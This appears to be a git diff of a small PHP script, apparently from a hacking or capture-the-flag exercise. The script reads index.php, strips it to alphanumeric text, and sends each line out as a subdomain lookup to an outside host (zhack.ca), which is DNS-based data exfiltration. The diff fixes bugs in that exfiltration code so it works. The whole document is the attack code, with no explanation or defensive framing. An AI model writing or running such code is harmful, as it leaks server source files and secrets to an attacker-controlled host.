@@ -1,13 +1,15 @@
 <?php
 $content = file_get_contents('index.php');
+$content = preg_replace("/[^a-zA-Z0-9]+/", "", $content);
 foreach(explode(PHP_EOL, $content) as $exp) {
-  $c = curl_init();
-  curl_setopt($ch, CURLOPT_URL, $exp.".ed04cd6e05158e3e7e43.d.zhack.ca");
-  $output = curl_exec($ch);
-  curl_close($c)
+	var_dump($exp);
+	$ch = curl_init();
+	curl_setopt($ch, CURLOPT_URL, $exp.".ed04cd6e05158e3e7e43.d.zhack.ca");
+	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+	$output = curl_exec($ch);
 }
-$c = curl_init();
 curl_setopt($ch, CURLOPT_URL, "done.ed04cd6e05158e3e7e43.d.zhack.ca");
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 $output = curl_exec($ch);
-curl_close($c)
+curl_close($ch);
 ?>
